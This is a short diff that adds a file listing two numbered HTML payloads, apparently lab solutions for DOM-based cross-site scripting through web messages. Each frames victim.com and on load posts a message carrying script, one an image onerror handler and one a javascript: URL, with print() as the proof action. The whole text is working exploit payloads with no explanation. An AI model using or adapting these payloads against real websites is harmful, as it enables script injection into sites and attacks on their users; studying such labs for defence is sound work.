@@ -1,0 +1,4 @@
+1. <iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<img src=x onerror=print()','*')"></iframe>
+
+2. <iframe src="https://victim.com/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
+
